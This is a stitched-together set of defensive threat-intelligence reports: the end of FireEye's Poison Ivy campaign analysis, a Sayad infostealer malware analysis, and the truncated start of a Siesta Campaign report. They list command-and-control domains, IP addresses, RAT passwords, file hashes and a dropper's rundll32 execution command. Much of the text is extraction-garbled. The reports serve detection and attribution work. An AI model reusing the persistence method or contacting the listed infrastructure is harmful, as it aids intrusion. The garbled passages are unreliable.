directions, helping to analyze and build additional
parsing functionality.</section>


<footnote>
16
     CamCrypt is available at https://code.google.com/p/camcrypt/.17
     SoX is available at http://sox.sourceforge.net/.</footnote>



<footer>9 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>

<section>
<heading>Locating the PIVY password with the calamine</heading>                                             
<heading>PyCommand script</heading>                                                                         
Many attackers leave the default “admin”
password unchanged.In this case, you can start                                          
using this decoder immediately.Often, however,
the attacker opts for better security by creating a                                      
unique password.But if you have access to the
PIVY-infected endpoint or to the PIVY server                                             
executable, retrieving the password is easy.You                                         
can retrieve the password a number of ways,
depending on your circumstance and preferences.If you have a malware-analysis environment setup,                                        
the Calamine PyCommand19 script for Immunity                                             
Debugger is quick and simple.<fn>18</fn> The Volatility
plugin is available at https://www.volatilesystems.com/default/volatility.<fn>19</fn> Corelan Team.“Starting to                                     
write Immunity Debugger PyCommands : my                                                  
cheatsheet.” January 2010.Follow these steps to use the PyCommand (these
steps may vary in some situations):

1.Attach Immunity Debugger to the process PIVY
injects into (or to the PIVY process itself if PIVY
does not inject).2.Set breakpoints on the send and connect
functions.3.Continue execution.4.Wait for the execution to break.5.Execute until return and step out of the
function.6.Run the PyCommand.7.Check the logs for the configuration details.</section>

<section>
<heading>Damage assessment</heading>
To effectively assess the damage sustained in an
attack, you must reconstruct the attacker’s
activities.Depending upon the attacker’s cleanup
efforts, fully reconstructing their activities from
host forensics alone may not be possible.But if
PIVY network activity is collected, the Calamine
ChopShop module can help uncover this
information.In the following example, we set up a test
environment and executed commands typically
run by attackers after they compromise a system
with PIVY and prepare to move laterally.Then

<footnote>
18
     The Volatility plugin is available at https://www.volatilesystems.com/default/volatility.19
     Corelan Team.“Starting to write Immunity Debugger PyCommands : my cheatsheet.” January 2010.:
	 IP Address............: 192.168.0.15
	 Subnet Mask ...........: 255.255.255.0
	 Default Gateway .........Over time, security professionals can acquire and                                   
analyze evidence to determine whether the                                           
attacks constitute malware-based espionage.It requires analyzing both the technical
and contextual aspects of a breach and exploring
competing hypotheses.<fn>23</fn>,<fn>24</fn> These steps are
important because investigators will always face
visibility gaps—limitations in knowing the
geographic and industry reach of attacks or details
of malware activity in some phases of the attack.</section>

<section>
<heading>Poison Ivy Sample Analysis</heading>
For this analysis, we collected 194 Poison Ivy
samples used in targeted attacks between 2008
and 2013.We extracted 22 different passwords
and 148 mutexes.We also mapped out the CnC
infrastructure, which comprised 147 domains and
165 IP addresses.We analyzed these samples to better understand
the tools, tactics, and procedures (TTPs) of the
attackers, explore campaign connections among
them, and enable defenders to better secure their
networks.In addition to clustering the samples
based on technical indicators, such as the
passwords and CnC information extracted from
the samples, we also analyzed contextual
indicators where possible, such as attackers’
targeting preferences and lures used in social
engineering.<footnote>
20
     SANS Computer Forensics.“Security Intelligence: Defining APT Campaigns.” June 2010.21
     SANS Computer Forensics.“Security Intelligence: Attacking the Cyber Kill Chain.” October 2009.22
     Richard Bejtlich.“Incident Phases of Compromise.” June 2009.23
     Richard Bejtlich.“Attribution Is Not Just Malware Analysis.” January 2010.24
     Jeffrey Carr.“Mandiant APT1 Report Has Critical Analytic Flaws.” February 2013.</footnote>

<footer>14 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>


Each PIVY server (the malware that the attacker           
sends to the target) can be configured to connect         
to multiple CnC servers using any TCP port.So            
seeing a PIVY sample that attempts to connect to          
multiple CnC servers on different TCP ports is not        
unusual.But the most common ports used in                
targeted attacks are those associated with Web            
traffic—especially 443, the TCP port used for             
SSL-encrypted Web traffic.Port 443 is a significant choice for two reasons.First, perimeter defenses must allow outbound
traffic through this port so that users can access
legitimate SSL-encrypted websites.Second,
because the traffic on port 443 is encrypted,
PIVY’s encrypted traffic may bl end in with normal
network activity.(Many protocol-aware perimeter
defenses, however, can detect and flag PIVY
traffic).Of the 147 mutexes in our                                       
sample set, 56 were designed for one-time use.If attackers create a unique password at build time                                    
rather than using the PIVY default “admin”, that                                       
custom password is the most unique indicator.While threat actors may change passwords used                                          
over time, we have found that they often use the                                       
same one for significant periods.When combined
with CnC data, the passwords used by the actors                                        
provide unique indicators that can be used to
cluster related activity.</section>

<section>
<heading>Clustering</heading>                                                                             
To cluster the activity of specific APT campaigns
across our PIVY sample set, we first grouped the                                       
PIVY samples by common CnC infrastructure.Using passive DNS, we clustered the domain
names used by the common IP address to which
they resolved.They are often used by malware to ensure only one instance of the malware is running

     on an infected system at a given time.26
     A campaign mark/code is typically a string designated by a threat actor that is often included as part of the malware communication and/or embedded within

      the malware binaries.It is used to identify targeted attack campaigns against a set number of targets (usually by industry), so the threat actor can keep

      attacks organized.27
     Launchers are malware built specifically to load other malware (payload), often by decrypting the payload and injecting it into a host process on the target’s

      endpoint.</footnote>



<footer>16 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>

To triangulate the timing (when the sample was       
likely used), we used the portable executable (PE)
compile time extracted from the PIVY samples and     
the date each sample appeared first appeared in a
malwareanalysis services such as VirusTotal.Each    
of these APT campaigns has been active from
2008 through 2013.</section>

<section>                                                     
<heading>Campaign 1: admin@338</heading>                                
Our data set for the admin@338 threat actor          
contains the following:                              
                                                     
•       21 Poison Ivy samples
•       3 passwords
•       43 CnC servers
The earliest admin@338 PIVY sample we have
dates to December 27, 2009.But we believe that
this campaign was active as early as January 7,
2008, using other PIVY passwords (key@123 and
gwx@123).This ongoing campaign tends to target
the finance, economic, and trade policy but we see
significant activity in the ISP/telco, government,
and defense sectors as well.<caption>Figure 9: Percent of admin@338
      APT group attacks by industry</caption>

<figure></figure>
</section>

<footer>17 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>

<section>
<heading>Attack vector</heading>                                       
The preferred attack vector used by this campaign   
is spear-phishing emails.Using content that is     
relevant to the target, these emails are designed   
to entice the target to open an attachment that     
contains the malicious PIVY server code.The content of the spear-phishing emails and the
decoy documents opened after exploitation tend
to be in English—although the character set of the
email message body in Figure 10 is actually
Chinese (character set GB2312).<fn>28</fn>

<figure></figure>

      <caption>Figure 10: Example spear-phishing
      email launched by the admin@338
      APT group</caption>
</section>


<footnote>
28
     Wikipedia.“GB 2312.” February 2013.The decoy documents that are opened in
exploitation typically contain content that is
contextually relevant to both the text of the
spear-phishing email and to the interests of the
intended target.The documents are legitimate—
but weaponized—documents in English.</section>

<section>
<heading>Clustering</heading>
In addition to the PIVY password admin@338, we
clustered individual attacks by using passive DNS
data to look at the IP addresses the CnC servers
have resolved to over time.We found that
common IP addresses among PIVY samples for
admin@338, key@123 and gwx@123.<figure></figure>

      <caption>Figure 11: GB2312 encoding in
      spear-phishing email launched by
      the admin@338 APT group</caption>

<figure></figure>


      <caption>Figure 12: Contents of decoy
      attachments used by the
      admin@338 APT group</caption>



<footnote>
29
     National Institute of Standards and Technology.“Vulnerability Summary for CVE-2012-0158.” April 2012.30
     National Institute of Standards and Technology.“Vulnerability Summary for CVE-2009-4324.” December 2009.</footnote>



<footer>19 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>


We can link PIVY passwords key@123 with              
admin@338 by observing the following                 
connections:                                         
                                                     
•	    The key@123 sample,                         
      808e21d6efa2884811fbd0adf67fda78,
      connects directly to 219.76.208.163.•	    Two CnC domain names from the               
      admin@338 sample                               
      8010cae3e8431bb11ed6dc9acabb93b7,
      www.webserver.dynssl.com and www.webserver.freetcp.com, resolved to that same   
      IP address (219.76.208.163).We can link PIVY passwords gwx@123 with              
admin@338 by observing the following
connections:                                         
                                                     
•       The gwx@123 sample                                 
     0323de551aa10ca6221368c4a73732e6                     
     connects to the CnC domain names microsofta.byinter.net, microsoftb.byinter.net, microsoftc.byinter.net, and microsofte.byinter.net.These      
     domain names resolved to 113.10.246.30               
     219.90.112.203, 202.65.220.64, 75.126.95.138,        
     219.90.112.197, 202.65.222.45, and
     98.126.148.114.•       The admin@338 sample
     8010cae3e8431bb11ed6dc9acabb93b7
     connects to the CnC domains www.webserver.fartit.com, www.webserver.freetcp.com, and www.webserver.dynssl.com.•       www.webserver.fartit.com resolved to
     113.10.246.30, 219.90.112.203,
        202.65.220.64, and 75.126.95.138, which
     overlap with the gwx@123 IP addresses.•       www.webserver.freetcp.com resolved to
     113.10.246.30, 219.90.112.203,
     202.65.220.64, 75.126.95.138,
     219.90.112.197, and 202.65.222.45, which
     overlap with the gwx@123 IP addresses.•       www.webserver.dynssl.com resolved to
     113.10.246.30, 219.90.112.203,
     219.90.112.203, 75.126.95.138,
     219.90.112.197, and 202.65.222.45, which
     overlap with the gwx@123 IP addresses.This data indicates a relationship among the
threat actors behind these attacks—in most cases,
they at least share a common CnC infrastructure.In addition to historic DNS resolutions, PIVY
process mutexes suggest a relationship between
PIVY passwords gwx@123 and admin@338.Although the mutexes of gwx@123, wwwst@
Admin, and admin@338 samples were different,
the choice of characters in the mutex revealed a
similar pattern.This ongoing campaign targets
a number of industries but appears to prefer
targets in higher education and the healthcare
   sectors.Instead, attacks attributed to th3bug use a                                  
strategic Web compromise to infect targets.This                                   
approach is more indiscriminate, which probably                                    
accounts for the more disparate range of targets.In the FireEye blog, we documented a recent
th3bug strategic Web compromise.<fn>31</fn>

In the following example, the actor or actors
behind the th3bug campaign compromised
multiple websites that catered to the intended
targets.The attacker used injected JavaScript on
the compromised websites to redirect targets to
an Internet Explorer exploit that dropped Stage 1
launcher/downloader mobile code.This
downloader then retrieved and installed a PIVY
RAT variant.<figure></figure>                                                                                 


     <caption>Figure 16: Example of
     initial infection vector
     by th3bug APT group</caption>

<footnote>
31
     Thoufique Haq and Yasir Khalid.“Internet Explorer 8 Exploit Found in Watering Hole Campaign Targeting Chinese Dissidents.” March 2013.“Vulnerability Summary for CVE-2013-0422.” February 2013.33
     National Institute of Standards and Technology.“Vulnerability Summary for CVE-2013-0422.” January 2013.34
     National Institute of Standards and Technology.“Vulnerability Summary for CVE-2011-3544.” October 2011.</footnote>



<footer>23 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>


The default PIVY password of admin has been            
used by multiple, distinct threat actors—so clearly,   
we cannot link all PIVY samples with the admin
password to th3bug.But evidence suggests that         
the attackers originally used the default password     
before settling on th3bug.We can link at least one    
PIVY sample that uses the admin password to the        
th3bug campaign based on the following
connections:                                           
                                                       
•	    The sample                                    
      8002debc47e04d534b45f7bb7dfcab4d                 
      connected to kr.iphone.qpoe.com with the
      PIVY password admin.•	    The domain kr.iphone.qpoe.com resolved to     
      180.210.206.96 on January 12, 2012.•	    The domain nkr.iphone.qpoe.com also
      resolved to 180.210.206.96 on January 3,         
      2012.•	    The domain nkr.iphone.qpoe.com also
      resolved to 101.78.151.179 on December
      23, 2011.•       The domain e.ct.toh.info resolved to
     101.78.151.179 on June 12, 2012.•       The sample
     55a3b2656ceac2ba6257b6e39f4a5b5a
     connected to ct.toh.info domain with the
     PIVY password th3bug.We found a smaller number of distinct PIVY
samples linked to th3bug than we did for the
admin@338 and menuPass campaigns.This
paucity is likely a result of two factors.First, th3bug does not appear to stage a high
volume of attacks.Instead, it appears to run only a
handful of strategic Web compromise attacks
each year.Second, th3bug stages its delivery of
PIVY.So to acquire the second-stage PIVY server
payload, an attack must be observed in real time.This sample
(b08694e14a9b966d8033b42b58ab727d)
connected to a control server at js001.3322.org
with a password xiaoxiaohuli (Chinese translation:
“little little fox”).Based on what we have found, it
appears that the threat actor behind menuPass
prefers to target U.S. and foreign defense
contractors.<figure></figure>

     <caption>Figure 20: Percent of
     menuPass APT group
     attacks by industry</caption>
</section>



<footer>25 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>


<section>
<heading>Attack vector</heading>

The menuPass campaign appears to favor spear              
phishing to deliver payloads to the intended              
targets.The email shown in Figure 21 shows a             
typical menuPass spear-phishing attempt.While the attackers behind menuPass have used             
other RATs in their campaign, it appears that they
use PIVY as their primary persistence mechanism.</section>

<section>
<heading>Weaponization</heading>
The menuPass campaign has used weaponized
Microsoft Word documents (CVE-2010-3333)35
and ZIP files containing executable files to drop
PIVY directly onto its targets.Figure 22 outlines
several executables delivered in ZIP files attached
to menuPass spear-phishing emails.This launcher includes a packed   
copy of the PIVY server that is subsequently         
unpacked and executed in memory shortly after a      
useless call to the FindFirstFile API.Out of the    
155 samples we collected f or menuPass, 81 of        
them are MFC apps with a document class.Out of
these 81 MFC launchers, 64 use the CBricksDoc        
class name.The most popular PIVY password used by the
menuPass campaign is keaidestone (used in 35
samples) followed by menuPass (24 samples).The
threat actor also used these PIVY passwords in
the same campaign:
•       suzuki

•       happyyongzi

•       admin

•       smallfish

•       XGstone

•       xiaoxiaohuli

•       fishplay


<footer>27 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>

A number of IPs in the 60.10.1.0/24 Classless       
Inter-Domain Routing (CIDR) block have hosted       
domains used in the menuPass campaign.We can       
see the connection between the keaidestone          
password and the XGstone password by                
observing the following connections in this same
/24 CDIR block:                                     
                                                    
•	    The IP 60.10.1.120 hosted the domain apple.cmdnetview.com.•	    The sample
      d8c00fed6625e5f8d0b8188a5caac115              
      connected to apple.cmdnetview.com with the    
      password XGstone.•	    The IP 60.10.1.115 hosted the domain autuo.xicp.net.•	    The sample
      b1deff736b6d12b8d98b485e20d318ea
      connected to autuo.xicp.net with the
      password keaidestone.•       The samples
     b1deff736b6d12b8d98b485e20d318ea
     and d8c00fed6625e5f8d0b8188a5caac115
     also shared the use of the CBricksDoc
     launcher.•       08709f35581e0958d1ca4e50b7d86dba
     has a compile time of July 20.2012 and
        connected to tw.2012yearleft.com with the
     password keaidestone.This sample also used
     the CBricksDoc launcher.•       2012yearleft.com was registered on
     February 13, 2012 by zhengyanbin8@gmail.com.•    The domain cmdnetview.com was also
  registered on February 13, 2012 by
  zhengyanbin8@gmail.com.•	    The sample e84853c0484b02b7518dd6837
      87d04fc connected to dedydns.ns01.us with    
      the password smallfish and used the          
      CBricksDoc launcher.We can see the connection between the              
keaidestone password and the happyyongzi
password by observing the connections in the       
60.10.1.0/24 CDIR block:                           
                                                   
•	    The domain maofajapa.3322.org resolved to
      60.10.1.121.•	    The sample
      cf8094c07c15aa394dddd4eca4aa8c8b             
      connected to maofajapa.3322.org with the     
      password happyyongzi.The password suzuki can be linked to keaidestone   
by observing the following relationships:
                                                   
•	    The sample                                
      410eeaa18dbec01a27c5b41753b3c7ed             
      connected to send.have8000.com with the      
      password of suzuki.•	    The domain have8000.com was registered on
      2012-02-13 via the email zhengyanbin8@       
      gmail.com.•	    The same email of zhengyanbin8@gmail.com  
      also registered cmdnetview.com on the same   
      date of 2012-02-13.•       As stated above, the sample
     b2dc98caa647e64a2a8105c298218462
     connected to apple.cmdnetview.com with the
     password XGstone.We can link the password of menuPass to
keaidestone by observing the following
connections:

•       08709f35581e0958d1ca4e50b7d86dba
     has a compile time of July 20, 2012 and
     connected to tw.2012yearleft.com with the
     password keaidestone.This sample also used
     the CBricksDoc launcher.•       tw.2012yearleft.com resolved to 60.10.1.114
     on June 6, 2012 and to 60.1.1.114 on March
     11, 2013.•       The domain fbi.zyns.com resolved to
     60.10.1.118 on August 21, 2012.•       68fec995a13762184a2616bda86757f8
     had a compile time of March 25, 2012 and
     connected to fbi.zyns.com with the password
     menuPass.This sample also used the
     CBricksDoc launcher.•       • The sample
     39a59411e7b12236c0b4351168fb47ce
     had a compile time of April 2, 2010 and
     connected to weile3322b.3322.org with the
     password keaidestone.This sample used a
     launcher of CPiShellPutDoc.•       The sample
     f5315fb4a654087d30c69c768d80f826 had
     a compile time of May 21, 2010 and
     connected to ngcc.8800.org with the
     password menuPass.This sample also used a
     launcher of CPiShellPutDoc.<footer>29 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>




We can see the connection between the                   
happyyongzi password and menuPass by                    
observing the following connections:                    
                                                        
•	    The sample
      e6ca06e9b000933567a8604300094a85                  
      connected to the domain sh.chromeenter.com with the password happyyongzi.•	    The domain sh.chromeenter.com previously       
      resolved to the IP 60.2.148.167.•	    The domain jj.mysecondarydns.com also          
      resolved to 60.2.148.167.Similar to other threat actors, this threat actor has   
also used PIVY samples using the default admin
password.Again, not all PIVY samples with the          
password admin can be linked to menuPass.But           
we can see the connection between the menuPass
and at least a couple of instances of PIVY using the    
admin password via the following connections:           
                                                        
•	    • The sample                                   
      56cff0d0e0ce486aa0b9e4bc0bf2a141 was
      compiled on 2011-08-31 and connected to           
      mf.ddns.info with the password menuPass.•	    The domain mf.ddns.info resolved to            
      54.241.8.84 on November 22, 2012.This
      same IP also hosted the domain av.ddns.us on      
      the same date.•	    The sample
      60963553335fa5877bd5f9be9d8b23a6                  
      was compiled on June 9, 2012 and connected        
      to av.ddns.us with the password of admin.•	    A number of menuPass and admin samples
      also shared the same CBricksDoc launcher          
      including but not limited to                      
      6d989302166ba1709d66f90066c2fd59                  
      and 4bc6cab128f623f34bb97194da21d7b6.•       The sample
     4e84b1448cf96fabe88c623b222057c4
     connected to jj.mysecondarydns.com with
     the password menuPass.The password of fishplay can be linked to
menuPass by observing the following
relationships:

•    The sample
     494e65cf21ad559fccf3dacdd69acc94
     connected to mongoles.3322.org with the
     password fishplay.•       The mongoles.3322.org domain resolved to
     123.183.210.28.•       The domain a.wubangtu.info also resolved to
     123.183.210.28.•       The sample
     a5965b750997dbecec61358d41ac93c7
     connected to 3q.wubangtu.info with the
     password menuPass.•       The sample
     494e65cf21ad559fccf3dacdd69acc94 and
     a5965b750997dbecec61358d41ac93c7
     also share the same CBricksDoc launcher.We can link the password of xiaoxiaohuli to
menuPass through the shared CPiShellPutDoc
launcher:

•       f5315fb4a654087d30c69c768d80f826 had
     a compile time of May 21, 2010 and
     connected to ngcc.8800.org with the
     password of menuPass.•       e6ca06e9b000933567a8604300094a85
     had a compile time of June 29, 2010 and
     connected to sh.chromeenter.com with the
     password happyyongzi.<footer>30 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>




•	    Both f5315fb4a654087d30c69c768d80f826           
      and                                                
      e6ca06e9b000933567a8604300094a85                   
      use the same CPiShellPutDoc launcher.Finally, we can link the password of happyyongzi to      
xiaoxiaohuli by observing the following                  
relationships:                                           
                                                         
•	    e6ca06e9b000933567a8604300094a85
      has a compile time of 2010-06-29 and
      connects to sh.chromeenter.com with the
      password happyyongzi.•       e62584c9cd15c3fa2b6ed0f3a34688ab has a
  compile time of 2009-12-28 and connects to
  the domain js001.3322.org with the password
  xiaoxiaohuli.•       Both
  e6ca06e9b000933567a8604300094a85
  and e62584c9cd15c3fa2b6ed0f3a34688ab
  use the same CPiShellPutDoc launcher.<figure></figure>

     <caption>Figure 21: Example
     of spear-phishing
     email launched by the
     menuPass APT group</caption>
</section>



<footer>31 www.fireeye.com</footer>
<header>Poison Ivy: Assessing Damage and Extracting Intelligence</header>

<section>
<heading>Conclusion</heading>

We cannot say with certainty why the actors
responsible for the admin@338, menuPass, and            
th3bug campaigns rely on Poison Ivy.But possible
explanations include PIVY’s easy-to-use features        
and the relative anonymity that an off-the-shelf
RAT provides for attackers.Compared to other RATs, PIVY is very easy to            
operate.Its graphical user interface (GUI) makes
building new servers and controlling infected           
targets simple.Attackers can point and click their
way through a compromised network and                   
exfiltrate data.Commodity RATs also complicate efforts by
security professionals to correlate a threat actor’s    
activity over time—attackers can hide in the sea of     
malicious activity that also uses Poison Ivy-based      
malware.By exposing the role of PIVY and other commodity        
RATs in APT campaigns we hope to complicate             
attackers’ ability to hide behind these off-the-shelf   
tools—and perhaps force them away from using            
these RATs.In this report, we have provided several                
techniques that network defenders can use to not        
only identify a PIVY infection, but also classify and   
correlate detected infections to previously             
observed APT activity.</section>

<section>
<heading>About FireEye</heading>
FireEye has invented a purpose-built, virtual
machine-based security platform that provides
real-time threat protection to enterprises and
governments worldwide against the next
generation of cyber attacks.These highly
sophisticated cyber attacks easily circumvent
traditional signature-based defenses, such as
next-generation firewalls, IPS, anti-virus, and
gateways.The FireEye platform provides
real-time, dynamic threat protection without the
use of signatures to protect an organization
across the primary threat vectors, including Web,
email, and files and across the different stages of
an attack life cycle.The core of the FireEye platform is a virtual
execution engine, complemented by dynamic
threat intelligence, to identify and block cyber
attacks in real time.FireEye has over 1,000
customers across more than 40 countries,
including over one-third of the Fortune 100.</section>


<section>
FireEye, Inc. | 1440 McCarthy Blvd.Milpitas, CA 95035 | 408.321.6300 | 877.FIREEYE (347.3393) | info@fireeye.com | www.fireeye.com</section>

<footer>
© 2014 FireEye, Inc. All rights reserved.FireEye is a registered trademark of FireEye,
Inc. All other brands, products, or service names are or may be trademarks or service
32
markswww.fireeye.com
        of their respective owners.RPT.PIVY.EN-US.082014
</footer>

</doc><doc>
<section>
<heading>
Sayad (Flying Kitten) Infostealer – is this the work of the Iranian Ajax
Security Team?</heading>
Information stealing malware has become increasingly popular among malware authors targeting not just
typical end-users, but also specific organizations and states.We have come across an intriguing piece of
malware (dubbed Sayad) that implements multiple host data collection methods and wraps them up into a
single .NET DLL.Sayad malware is typically distributed through phishing emails.</section>
<section>
Introduction

This week I got hold of a sample of “Sayad”, so I ran it through our Vinsula Execution Engine (VEE) to find
out what it does and how it works.Credit for sharing the sample of the malware goes to @MalwareChannel.The information this malware is able to steal and upload to a Web server controlled by the hackers is highly
sensitive and would have an enormous impact on compromised individuals, businesses, and governments.<figure></figure>
There are several interesting aspects of Sayad malware, and after running the malicious executable through
the Vinsula Execution Engine to analyze its behavior, I discovered that the initial executable titled
WEXTRACT.exe (SHA1:1c52b749403d3f229636f07b0040eb17beba28e4) was in fact a self extracting EXE
that dropped and launched the Binder executable malware, ~8f60957b3689075fa093b047242c0255.exe
(SHA1:69fd05ca3a7514ea79480d1dbb358fab391e738d).Once the Binder executable malware is launched, it
checks the .NET version installed on the machine and drops the information stealer DLL component, Sayad
(aka Client) – DiagnosticsService.dll (SHA1:8521eefbf7336df5c275c3da4b61c94062fafdda).The malware executable is delivered by a phishing
email or the user is somehow tricked into downloading it and executing it.Once the user clicks on the
malware, it extracts the actual malware executable and launches it.<figure></figure>
</section>
<section>
Analysis

Our first step was to run the “Sayad” binary through our Vinsula Execution Engine to find out just what it
does.The process tree below as reported by our engine allows us to visually present the parent/child
relationship between all the processes and their command lines related to the execution for this specific
malware.For the same reason, we also don’t show the complete command line of the
rundll32.exe.Because this is an important detail, here is how it shows up in our Vinsula malware report:
<list>
rundll32.exe “C:\Users\[User]\AppData\Roaming\Client\DiagnosticsService.dll”,78121
</list>
Sayad malware is a self-contained executable that embeds within itself all the required malicious components,
meaning that it doesn’t need to download any additional malicious content from the C2 server, which may
appear suspicious.Its three core components are structured as “Russian Dolls,” i.e., one wrapped within the next in layers.Here
is the list with the key components starting from the outermost one.Hashes of all investigated components
are provided at the end of this post.<list>
      Self-extracting executable (WEXTRACT.exe)
      Binder (~8f60957b3689075fa093b047242c0255.exe)
      Client (DiagnosticsService.dll)
</list>
Further down, I will go into greater detail and provide more information about the behavior and static
building blocks of each of these components.For now, I am just aiming to capture the scope of each
executable involved in the orchestration of the Sayad malware.As we can see in the cascade tree above, the main malware WEXTRACT.exe is a self-extracting executable
which extracts the Binder ~8f60957b3689075fa093b047242c0255.exe, and it then launches it.The Binder is
responsible for checking the installed .NET version and extracting the relevant .NET Client –
DiagnosticsService.dll.This .NET DLL implements the data collecting logic and sends the collected data to
the C2 server.The following diagram captures a bit more of the detail of the malware workflow.<figure></figure>
The main self-extracting binary WEXTRACT.exe drops two files in the user’s appdata temp directory as shown
in the following entries from our Vinsula report.These two files are the two parts of the Binder – a .NET
executable (~8f60957b3689075fa093b047242c0255.exe) and its configuration file
(~8f60957b3689075fa093b047242c0255.exe.config).Details along with snippets from Binder’s source code
are provided in the next sections.They are
stored in a temporary location C:\Users\[User]\AppData\Local\Temp\IXP000.TMP.<figure></figure>
After dropping the Binder and its configuration file, the main self-extracting binary launches the Binder
(~8f60957b3689075fa093b047242c0255.exe).Similar to the process tree from our Vinsula report above, the
below screenshot from Process Explorer shows the Binder being launched by the self-extracting binary.<figure></figure>
The purpose of the Binder is to create and drop the core malware component (also titled Client –
DiagnosticsService.dll) and its configuration disguised as a DLL file, base.dll.Below is a snippet from our
Vinsula report capturing the relevant event entries that show the Client and its configuration being created.The Binder is a .NET executable whose
purpose is to find out what version of .NET is currently installed, and then drop the relevant .NET Client DLL
accordingly.There are two versions of the Client DLL that are stored as embedded resources in Binder’s
executable.That makes the malware less chattier and allows it to drop the correct .NET version DLL without
the need to download it from a malicious Web location.<figure></figure>

The Binder ensures that the malware will survive reboots by registering the command for loading and
executing the Client DLL (DiagnosticsService.dll) to run at startup as shown below.<figure></figure>
The following shows the registry modification that comes as a result of the executing the code above.<figure></figure>



And here is the corresponding registry modification entries from Vinsula’s report.More on the details
regarding the rundll32.exe command will be provided in the following sections.The WinExec API has been provided only for
backward compatibility with 16-bit Windows.<figure></figure>

A quick Googling of the method names of the two methods FromUrlSafeBase64String ToUrlSafeBase64String
from the Base64.cs file shows that the code has been copied from the following stackoverflow post “.NET MVC
Routing w/ Url Encoding Problems”.The following screenshot shows the Binder project in Visual Studio.<figure></figure>
As previously mentioned, the Binder extracts the relevant Client DLL according to the installed .NET version.There are two copies of the Client DLL, targeting .NET2 and .NET4, both stored as embedded resources inside
the Binder file image.<figure></figure>

The Binder is also responsible for extracting the configuration data located at the end of the Binder’s file
image and storing it in the base.dll file.The configuration data is stored as plain text and Base64 encoded data
and holds following configuration attributes:
<list>
      BuildId – a unique GUID that identifies the build of the malware.The malware
authors decided to implement the core data collection and transmission into a single .NET DLL.Typically,
unknown .NET DLLs do not look as suspicious as a native Win32 DLL or an executable.Also, a DLL requires
an executable to load it in order to execute any code implemented by the DLL.Sayad leverages rundll32.exe,
which is a shell that allows the loading of 32-bit DLLs and the execution of exported APIs.Basically, Sayad Client is a 32-bit .NET DLL.Rundll32.exe would be able to load Sayad Client DLL, but as it is
a .NET managed DLL it doesn’t support exporting of native unmanaged APIs, thus Rundll32.exe cannot
execute any of the .NET/C# public methods implemented in the Sayad Client DLL.Going back to the malware process tree we can see that Binder launches the following command, which is
instructing Windows utility rundll32.exe to load Sayad Client DiagnosticsService.dll, obtain the function
address of the native API named “78121” via GetProcAddress(), and call the function pointer of the entry
point “78121”.rundll32.exe "C:\Users\
[User]\AppData\Roaming\Client\DiagnosticsService.dll",78121

Microsoft C# compiler does not support interop via the export of unmanaged native APIs from within a
.NET/C# DLL.However, if we open Sayad Client DLL it is clear that the DLL does export a native unmanaged
API function titled “78121”.<figure></figure>
How have the malware authors managed to export a native API from a C# DLL?Although not supported by
Microsoft, this is not impossible if after building the executable, the MSIL is modified to map a managed static
method to the name of a native unmanaged API and then export the API so that it appears in the Export
Address Table of the managed PE (Portable Executable) image.In this case, a static method Main() of
Program class located in Program.cs of the Sayad Client DLL (DiagnosticsService.dll) maps to the native API
“78121”.As shown below, a special declaration is applied to ensure that the caller (rundll32.exe) executes a
method matching the required __stdcall calling convention.Here is the MSIL of the static Main() method.<figure></figure>
And below is the corresponding disassmebled C# version.<figure></figure>


Sayad Client DLL’s main entry point initializes and starts up all data collection methods that the assembly
implements.The code below is executed by using the command rundll32.exe “C:\Users\
[User]\AppData\Roaming\Client\DiagnosticsService.dll”,7812

The malware authors left some debugging messages that indicate the different stages of the Sayad Client
initialization.The code also handles and collects all uncaught exceptions thrown during the execution of the
malware by attaching to AppDomain.UnhandledException and Application.ThreadException events.In the next step, the client loads the configuration discussed in a previous section and then proceeds to start
up all data collection components, as shown in the snippet below.Here is the UploadBuffer method that uses .NET WebClient class to upload the data.<figure></figure>
Both the Binder and the Sayad Client have been built with debugging information which reveals some details
about the source code locations for these two .NET projects.f:\Projects\C#\Sayad\Source\Binder\obj\Debug\Binder.pdb
F:\Projects\C#\Sayad\Source\Client\bin\x86\Debug\Client.pdb
<figure></figure>
<figure></figure>
</section>
<section>
Network Activity

Communication with the C2 server is limited to transferring collected data from the user and the host to the
C2 server.The stolen data being uploaded to the malicious server is encrypted first using a RSA public key
which is stored in the malware configuration file.The Sayad Client (DiagnosticsService.dll) implements an
HTTP client that uploads the encrypted data to the malicious Web server with host name
“0o0o0o0o0[dot]com” and IP address 107.6.182.179.The Binder component doesn’t implement any
communication features.The following is a short segment from Vinsula network activity report.<figure></figure>
Below is the WHOIS information for the malicious host 0o0o0o0o0[dot]com (IP 107.6.182.179).The domain
was registered on June 30, 2014.Interestingly, the registrant, admin and tech email addresses are
domain@microsofts.com.One wonders if the registrar, OnlineNIC, Inc, is verifying whether or not these are
real email addresses.<figure></figure>
</section>
<section>
YARA detection rule

Based on the details that have been identified, we can create two simple YARA rules for detection of the Sayad
Binder and Sayad Client.Hopefully this will help other malware researchers and security companies.Hope that would help other
researchers.The Sayad malware
doesn’t seem to be implementing any sophisticated mechanisms for collecting and transmitting the stolen
data.<list>
The hashes of the files related to this sample are copied below.<doc>
<section>
<heading>
The Siesta Campaign: A New Cybercrime Operation Awakens</heading>
In the past few weeks, we have received several reports of targeted attacks that exploited various
application vulnerabilities to infiltrate various organizations.Similar to the Safe Campaign, the campaigns
we noted went seemingly unnoticed and under the radar.The attackers orchestrating the campaign we call
the Siesta Campaign used multicomponent malware to target certain institutions that fall under the
following industries:

      Consumer goods and services
      Energy
      Finance
      Healthcare
      Media and telecommunications
      Public administration
      Security and defense
      Transport and traffic

Threat actors don’t always rely on complex attack vectors to infiltrate an organization’s network.Attackers
can also make use of basic social engineering techniques for their victims to take the bait, such as in our
case study below.</section>
  <section>
The Siesta Campaign: A Case Study

We are currently investigating an incident that involved attackers sending out spear-phishing emails
addressed to executives of an undisclosed company.These emails were sent from spoofed email addresses
